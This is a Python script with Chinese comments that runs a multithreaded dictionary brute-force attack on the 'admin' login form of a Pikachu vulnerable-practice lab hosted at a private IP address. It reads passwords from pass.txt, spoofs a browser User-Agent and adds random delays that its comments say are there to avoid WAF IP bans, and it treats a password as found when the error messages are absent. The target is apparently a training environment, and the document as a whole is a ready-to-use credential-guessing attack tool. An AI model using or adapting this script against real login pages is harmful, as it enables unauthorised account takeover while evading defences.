import requests
import concurrent.futures
import time
import random

# 目标网址
url = "http://192.168.58.129/pikachu-master/vul/burteforce/bf_form.php"

# 伪装请求头
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"
}

# 爆破核心函数
def try_password(pwd):
    pwd = pwd.strip()
    if not pwd: 
        return None
    
    data = {
        "username": "admin",
        "password": pwd,
        "submit": "Login"
    }
    
    try:
        # 核心：加一个随机延时，模拟真人操作，防止被 WAF 封 IP
        time.sleep(random.uniform(0.1, 0.5))
        
        response = requests.post(url, data=data, headers=headers, timeout=3)
        
        # 打印每次尝试的结果，方便肉眼观察
        print(f"[*] 尝试: {pwd:10} | 状态码: {response.status_code}")
        
        # 判断是否成功
        if "password is not exists" not in response.text and "password error" not in response.text:
            return pwd
        return None
        
    except Exception as e:
        print(f"[!] 尝试: {pwd:10} | 请求报错: {e}")
        return None

# 主函数
def main():
    print("[*] 开始多线程降速爆破...")
    start_time = time.time()
    
    # 读取字典
    try:
        with open("pass.txt", "r", encoding="utf-8", errors="ignore") as f:
            passwords = f.readlines()
    except FileNotFoundError:
        print("[-] 错误：找不到 pass.txt 字典文件！")
        return

    # 开 5 个线程（不要太多）
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        results = executor.map(try_password, passwords)
        
        for result in results:
            if result:
                print(f"\n[+] 恭喜！成功找到正确密码: {result}")
                print(f"[*] 总耗时: {time.time() - start_time:.2f} 秒")
                exit(0)
                
    print(f"\n[-] 字典跑完，未找到正确密码。总耗时: {time.time() - start_time:.2f} 秒")

if __name__ == "__main__":
    main()
          